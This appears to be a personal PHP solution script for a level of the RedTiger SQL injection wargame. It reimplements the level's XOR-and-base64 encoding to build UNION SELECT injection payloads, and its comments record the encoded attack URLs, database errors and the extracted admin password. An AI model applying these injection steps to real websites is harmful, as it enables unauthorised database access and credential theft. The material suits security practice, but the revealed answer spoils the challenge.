<?php
  		
	function encrypt($str)
	{
		$cryptedstr = "";
		for ($i =0; $i < strlen($str); $i++)
		{
			$temp = ord(substr($str,$i,1)) ^ 192;
			
			while(strlen($temp)<3)
			{
				$temp = "0".$temp;
			}
			$cryptedstr .= $temp. "";
		}
		return base64_encode($cryptedstr);
	}
  
	function decrypt ($str)
	{
		if(preg_match('%^[a-zA-Z0-9/+]*={0,2}$%',$str))
		{
			$str = base64_decode($str);
			if ($str != "" && $str != null && $str != false)
			{
				$decStr = "";
				
				for ($i=0; $i < strlen($str); $i+=3)
				{
					$array[$i/3] = substr($str,$i,3);
				}

				foreach($array as $s)
				{
					$a = $s^192;
					$decStr .= chr($a);
				}
				
				return $decStr;
			}
			return false;
		}
		return false;
	}
	#echo decrypt("MTI5MTY0MTczMTY5MTc0");
	#Admin
	echo encrypt("' UNION SELECT 1,password,3,4,5,username,7 FROM level3_users WHERE username='Admin");
	echo "\n\n\n".decrypt('MjMxMjI0MTgxMTc0MTY5MTc1MTc0MjI0MTc5MTY1MTcyMTY1MTYzMTgwMjI0MjQxMjM2MTgxMTc5MTY1MTc4MTc0MTYxMTczMTY1MjM2MjQzMjM2MjQ0MjM2MjQ1MjM2MTc2MTYxMTc5MTc5MTgzMTc1MTc4MTY0MjM2MjQ3MjI0MTY2MTc4MTc1MTczMjI0MTcyMTY1MTgyMTY1MTcyMjQzMTU5MTgxMTc5MTY1MTc4MTc5MjI0MTgzMTY4MTY1MTc4MTY1MjI0MTgxMTc5MTY1MTc4MTc0MTYxMTczMTY1MjUzMjMxMTI5MTY0MTczMTY5MTc0MjI0')
	# MjMxMjI0MTgxMTc0MTY5MTc1MTc0MjI0MTc5MTY1MTcyMTY1MTYzMTgwMjI0MjQxMjM2MjQyMjM2MjQzMjM2MjQ0MjM2MjQ1MjM2MjQ2MjM2MjQ3
	#https://redtiger.labs.overthewire.org/level3.php?usr=MjMxMjI0MTgxMTc0MTY5MTc1MTc0MjI0MTc5MTY1MTcyMTY1MTYzMTgwMjI0MjQxMjM2MjQyMjM2MjQzMjM2MjQ0MjM2MjQ1MjM2MjQ2MjM2MjQ3
	#Show userdetails:
#Warning: mysql_fetch_object(): supplied argument is not a valid MySQL result resource in /var/www/hackit/level3.php on line 44 Warning: mysql_num_rows() expects parameter 1 to be resource, boolean given in /var/www/hackit/level3.php on line 4
# https://redtiger.labs.overthewire.org/level3.php?usr=MjMxMjI0MTgxMTc0MTY5MTc1MTc0MjMxMjI0MTQ5MTQyMTM3MTQzMTQyMjI0MTQ3MTMzMTQwMTMzMTMxMTQ4MjI0MjQxMjM2MjQyMjM2MjQzMjM2MjQ0MjM2MjQ1MjM2MjQ2MjM2MjQ3MjI0MTM0MTQ2MTQzMTQxMjI0MTcyMTY1MTgyMTY1MTcyMjQzMTU5MTgxMTc5MTY1MTc4MTc5

#' UNION SELECT 1,2,3,4,5,6,7 FROM level3_users WHERE username='Admin
#MjMxMjI0MTQ5MTQyMTM3MTQzMTQyMjI0MTQ3MTMzMTQwMTMzMTMxMTQ4MjI0MjQxMjM2MjQyMjM2MjQzMjM2MjQ0MjM2MjQ1MjM2MjQ2MjM2MjQ3MjI0MTM0MTQ2MTQzMTQxMjI0MTcyMTY1MTgyMTY1MTcyMjQzMTU5MTgxMTc5MTY1MTc4MTc5MjI0MTUxMTM2MTMzMTQ2MTMzMjI0MTgxMTc5MTY1MTc4MTc0MTYxMTczMTY1MjUzMjMxMTI5MTY0MTczMTY5MTc0
#https://redtiger.labs.overthewire.org/level3.php?usr=MjMxMjI0MTQ5MTQyMTM3MTQzMTQyMjI0MTQ3MTMzMTQwMTMzMTMxMTQ4MjI0MjQxMjM2MjQyMjM2MjQzMjM2MjQ0MjM2MjQ1MjM2MjQ2MjM2MjQ3MjI0MTM0MTQ2MTQzMTQxMjI0MTcyMTY1MTgyMTY1MTcyMjQzMTU5MTgxMTc5MTY1MTc4MTc5MjI0MTUxMTM2MTMzMTQ2MTMzMjI0MTgxMTc5MTY1MTc4MTc0MTYxMTczMTY1MjUzMjMxMTI5MTY0MTczMTY5MTc0
#Show userdetails:Username: 	2 First name: 	6 Name: 7 ICQ: 	5 Email: 	4
#phew*

#MjMxMjI0MTQ5MTQyMTM3MTQzMTQyMjI0MTQ3MTMzMTQwMTMzMTMxMTQ4MjI0MjQxMjM2MTc2MTYxMTc5MTc5MTgzMTc1MTc4MTY0MjM2MjQzMjM2MjQ0MjM2MjQ1MjM2MTgxMTc5MTY1MTc4MTc0MTYxMTczMTY1MjM2MjQ3MjI0MTM0MTQ2MTQzMTQxMjI0MTcyMTY1MTgyMTY1MTcyMjQzMTU5MTgxMTc5MTY1MTc4MTc5MjI0MTUxMTM2MTMzMTQ2MTMzMjI0MTgxMTc5MTY1MTc4MTc0MTYxMTczMTY1MjUzMjMxMTI5MTY0MTczMTY5MTc0
#thisisaverysecurepasswordEEE5rt

?>
